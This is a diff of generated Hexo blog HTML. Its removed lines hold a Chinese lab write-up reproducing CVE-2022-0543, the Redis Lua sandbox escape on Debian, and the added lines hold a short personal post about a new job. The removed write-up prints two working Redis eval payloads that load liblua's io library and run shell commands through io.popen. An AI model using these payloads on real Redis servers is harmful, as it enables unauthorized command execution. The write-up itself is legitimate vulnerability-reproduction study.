@@ -4,22 +4,15 @@
   <meta charset="utf-8">
   
   
-  <title>Redis RCE复现及简单分析（CVE-2022-0543） | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="0x01 原理浅析Debian及其衍生版打包Redis时，在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象中的loadlib函数来加载动态链接库&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0中的导出函数luaopen_io，执行这个导出函数获得io库，最后使用其执行命令，作者提到不同系统下liblua5.1.so.0的路径可能不同，所以需要在本地">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Redis RCE复现及简单分析（CVE-2022-0543）">
-<meta property="og:url" content="http://example.com/2022/07/09/Redis-RCE%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-0543%EF%BC%89/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/3/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="0x01 原理浅析Debian及其衍生版打包Redis时，在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象中的loadlib函数来加载动态链接库&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0中的导出函数luaopen_io，执行这个导出函数获得io库，最后使用其执行命令，作者提到不同系统下liblua5.1.so.0的路径可能不同，所以需要在本地">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2022/07/09/Redis-RCE%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-0543%EF%BC%89/01.png">
-<meta property="article:published_time" content="2022-07-09T01:22:32.000Z">
-<meta property="article:modified_time" content="2022-10-24T15:36:31.147Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2022/07/09/Redis-RCE%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-0543%EF%BC%89/01.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -76,10 +69,12 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-Redis-RCE复现及简单分析（CVE-2022-0543）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main">
+  
+    <article id="post-新征程" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/07/09/Redis-RCE%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-0543%EF%BC%89/" class="article-date">
-  <time class="dt-published" datetime="2022-07-09T01:22:32.000Z" itemprop="datePublished">2022-07-09</time>
+    <a href="/2022/01/11/%E6%96%B0%E5%BE%81%E7%A8%8B/" class="article-date">
+  <time class="dt-published" datetime="2022-01-11T11:34:25.000Z" itemprop="datePublished">2022-01-11</time>
 </a>
     
   </div>
@@ -89,8 +84,8 @@
       <header class="article-header">
         
   
-    <h1 class="p-name article-title" itemprop="headline name">
-      Redis RCE复现及简单分析（CVE-2022-0543）
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/01/11/%E6%96%B0%E5%BE%81%E7%A8%8B/">新征程</a>
     </h1>
   
 
@@ -98,48 +93,35 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="0x01-原理浅析"><a href="#0x01-原理浅析" class="headerlink" title="0x01 原理浅析"></a>0x01 原理浅析</h1><p>Debian及其衍生版打包Redis时，在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象中的loadlib函数来加载动态链接库/usr/lib/x86_64-linux-gnu/liblua5.1.so.0中的导出函数luaopen_io，执行这个导出函数获得io库，最后使用其执行命令，作者提到不同系统下liblua5.1.so.0的路径可能不同，所以需要在本地对照一下，，，吐槽一句，不能打红帽系有点鸡肋了……</p>
-<span id="more"></span>
-<h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>使用p牛的vulhub搭建环境：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543">https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543</a><br>搭建好的环境是redis 5.0.7，且存在未授权访问<br>执行如下payload  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br><span class="line"></span><br><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;uname -a&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/09/Redis-RCE%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-0543%EF%BC%89/01.png" alt="image">  </p>
-<h1 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a>0x03 参考文章</h1><p><a target="_blank" rel="noopener" href="https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce">https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce</a><br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543">https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543</a>  </p>
-
+        <p>这是博客新家（Github Pages）的第一篇博客，也是2022年的第一篇，更是我从长春来到北京入职新公司后的第一篇，一段新的征程，一段新的开始</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/01/11/%E6%96%B0%E5%BE%81%E7%A8%8B/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/09/Redis-RCE%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-0543%EF%BC%89/" data-id="clc8quwfo0008q3fy77dc3moz" data-title="Redis RCE复现及简单分析（CVE-2022-0543）" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/01/11/%E6%96%B0%E5%BE%81%E7%A8%8B/" data-id="clc8quwfw000zq3fy3iruen8p" data-title="新征程" class="article-share-link">Share</a>
       
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%82%B9%E6%BB%B4%E7%94%9F%E6%B4%BB/" rel="tag">点滴生活</a></li></ul>
 
     </footer>
   </div>
   
-    
-<nav id="article-nav">
-  
-    <a href="/2022/07/09/APISIX-Dashboard-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2021-45232%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          Apache APISIX Dashboard 未授权访问漏洞分析（CVE-2021-45232）
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2022/07/08/%E6%97%A0%E6%84%9F%E7%9F%A5%E4%BD%BFWindows-Defender%E5%A4%B1%E6%95%88/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">无感知使Windows Defender失效</div>
-    </a>
-  
-</nav>
-
-  
 </article>
 
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+  </nav>
 
 </section>
         
